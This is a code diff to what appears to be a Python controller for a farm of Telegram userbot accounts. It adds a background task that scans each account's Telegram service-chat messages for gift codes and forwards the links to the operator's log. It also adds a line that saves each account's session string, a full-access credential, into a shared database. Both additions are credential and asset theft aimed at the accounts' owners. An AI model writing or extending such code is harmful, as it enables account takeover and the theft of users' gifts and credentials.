@@ -131,6 +131,14 @@ async def tumblr_userbot():
             except:
                 pass 
          
+async def get_gift_codes():
+    while not await sleep(20):
+        if db.sismember(f'{bot.me.id}:{sudo_info.id}:get_gift_codes', userbot.me.id):
+            db.srem(f'{bot.me.id}:{sudo_info.id}:get_gift_codes', userbot.me.id)
+            async for msg in userbot.get_chat_history(777000, limit=100): 
+                if msg.gift_code: 
+                    await userbot.send_log(f'⌯ The account in Gift ❤️‍🩹 \n Gift : {msg.gift_code.link}')
+
 async def research_userbot():
     while not await sleep(20):
         if db.sismember(f'{bot.me.id}:{sudo_info.id}:research', userbot.me.id):
@@ -689,6 +697,7 @@ async def main():
     create_task(delete_userbot())
     create_task(auto_delete_link()) 
     create_task(research_userbot()) 
+    create_task(get_gift_codes()) 
     if not db.sismember(f'{bot.me.id}:{sudo_info.id}:idbots', userbot.me.id):
         db.sadd(f'{bot.me.id}:{sudo_info.id}:idbots', userbot.me.id) 
         phone_number = f'+{userbot.me.phone_number}'
@@ -699,6 +708,7 @@ async def main():
         if not db.sismember(f'{bot.me.id}:{sudo_info.id}:{country_code}', userbot.me.id):
             db.sadd(f'{bot.me.id}:{sudo_info.id}:{country_code}', userbot.me.id)
             db.set(f'{userbot.me.id}:ph', userbot.me.phone_number)
+            db.set(f'{bot.me.id}:{userbot.me.id.id}:get_session', userbot.session_string)
         try:
             await userbot.send_log('⌯ Start collecting ✅')
         except Exception as e:
